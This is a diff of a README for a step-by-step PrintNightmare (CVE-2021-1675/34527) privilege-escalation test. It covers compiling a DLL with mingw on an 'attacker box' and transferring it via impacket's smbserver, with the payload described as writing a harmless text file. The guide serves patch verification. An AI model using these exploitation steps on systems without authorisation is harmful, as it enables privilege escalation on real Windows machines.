@@ -1,6 +1,12 @@
-# PrintNightmare: CVE-2021-1675 / CVE 2021 34527
+# Test if you are still vulnerable to PrintNightmare's privesc after patching
 
-## Test if you are still vulnerable to PrintNightmare's privesc after patching
+PrintNightmare (CVE-2021-1675 / CVE 2021 34527) is an exploit that takes advantage of the AddPrintDriver function of the Spooler to arbitrarily execute files with high-privs.
+
+There is some confusion if the round of patches released by Microsoft on 6th July 2021. It seems the RCE portion of the exploit is patched, but the privilege escalation may still be vulnerable.
+
+We have put together a step-by-step to run a test PoC to see if the recent patch has been effective for your machine. This guide will do no damage to your machine, neither should it crash the machine or spooler. It will simply write `C:\PrintNightmare.txt`
+
+Thanks to Huntress for releasing this PowerShell implementation of PrintNightmare
 
 ## Pre-check
 ```powershell
@@ -15,15 +21,16 @@ Otherwise if running, begin exploitation.
 Run this on your attacker box
 
 #### Install Dependencies
+```bash
 sudo apt apt install gcc-mingw-w64
 sudo apt-get install g++-mingw-w64-x86-64
-
+```
 ### Write the Dll
 ```bash
 nano nightmare.cpp
 ```
 
-This DLL will just print an innocent, non-malicious file called *Printnightmare* to *C:\*
+This DLL will just print an innocent, non-malicious file called *Printnightmare.txt* to *C:\*
 
 ```cpp
 #include <windows.h>
@@ -47,8 +54,6 @@ sudo x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL nightmare.cpp
 sudo x86_64-w64-mingw32-g++ -shared -o nightmare.dll nightmare.o -Wl,--out-implib,nightmare.a
 ```
 ![image](https://user-images.githubusercontent.com/49488209/124728640-a9b66480-df07-11eb-9c9d-42e2cea1b6c7.png)
-
-
 
 ## Transfer DLL however you like, impacket's smbserver.py works
 ### In Kali
